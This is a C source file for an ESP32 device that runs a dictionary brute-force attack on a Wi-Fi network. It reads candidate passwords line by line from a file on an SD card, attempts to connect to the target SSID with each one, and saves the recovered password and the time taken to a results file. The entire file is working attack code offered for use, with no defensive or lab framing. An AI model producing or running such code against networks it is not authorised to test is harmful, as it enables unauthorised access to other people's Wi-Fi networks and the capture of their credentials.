#include "wifi_brute_force.h"

static const char *TAG = "Wifi-brute";


static void write_results(char* ssid, char* password, float elapsed){
    /* Escribir resultados en SD */
    char path[256];
    char timestamp[64];
    get_timestamp(timestamp);
    snprintf(path, sizeof(path), "results/wifi-brute-force/wifi-%s.txt", timestamp);
    char data[256];
    snprintf(data, sizeof(data), "Tiempo: %0.2fs\n SSID: %s\n PASSWORD: %s", elapsed, ssid, password);
    sd_write_file(path, data);
}

static esp_err_t s_read_file_and_attack(char* ssid, const char *path){
    int64_t start = esp_timer_get_time();
    ESP_LOGI(TAG, "Reading file %s", path);
    FILE *f = fopen(path, "r");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open file for reading");
        return ESP_FAIL;
    }
    char line[EXAMPLE_MAX_CHAR_SIZE];
    while(fgets(line, sizeof(line), f) != NULL){
        /* Quitar car√°cteres de final de linea */
        char *pos = strchr(line, '\n');
        if (pos) *pos = '\0';
        pos = strchr(line, '\r');
        if (pos) *pos = '\0';
        ESP_LOGI(TAG, "Read from file: '%s'", line);
        connect_to_ap(ssid, line);
        /* Esperar a que se desconecte o se conecte */
        while(!disconnected){
            vTaskDelay(200);
            if (connected_to_wifi){
                ESP_LOGI(TAG, "Found '%s' password", line);
                int64_t end = esp_timer_get_time();
                write_results(ssid, line, elapsed_seconds(start, end));
                return ESP_OK;
            }
        }
        disconnected = false;
    }
    fclose(f);
    return ESP_OK;
}

int brute_force_wifi(char* ssid, char* dict_path){    
    char file_dict[64];
    sprintf(file_dict, MOUNT_POINT "/%s", dict_path);
    s_read_file_and_attack(ssid, file_dict);
    return 1;
}